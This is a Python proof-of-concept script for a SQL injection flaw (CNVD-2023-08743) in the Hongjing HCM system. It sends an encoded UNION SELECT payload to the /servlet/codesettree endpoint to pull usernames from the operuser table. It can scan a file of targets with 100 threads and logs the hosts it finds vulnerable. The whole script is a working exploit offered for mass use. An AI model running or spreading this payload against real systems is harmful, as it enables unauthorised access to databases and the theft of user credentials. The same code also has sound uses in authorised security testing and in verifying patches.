import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description='宏景HCM SQL注入漏洞复现 (CNVD-2023-08743)')
    parser.add_argument('-u','--url',help='plaese input attack url')
    parser.add_argument('-f','--file',help='please input attack file')
    agres = parser.parse_args()                                    
    if agres.url and not agres.file:                       
        poc(agres.url)                              
    elif agres.file and not agres.url:                
        url_list = []                             
        with open (agres.file,'r',encoding='utf-8') as fp:  
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     
        mp = Pool(100)                    
        mp.map(poc, url_list)               
        mp.close()                        
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')
def banner():
    text="""
  _    _  _____ __  __ 
 | |  | |/ ____|  \/  |
 | |__| | |    | \  / |
 |  __  | |    | |\/| |
 | |  | | |____| |  | |
 |_|  |_|\_____|_|  |_|
                       
"""
def poc(target):
    url = target + '/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0'
    }
    
    try:
        respnose = requests.get(url=url,headers=headers,timeout=5,verify=False)
        if respnose.status_code==200 and "root" in respnose.text:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]{target} Vulnerability exists'+'\n')
        else:
            print(f'[-]{target} Vulnerability does not exists')
    except:
        print(f'[*]{target} server error')


if __name__=='__main__':
    main()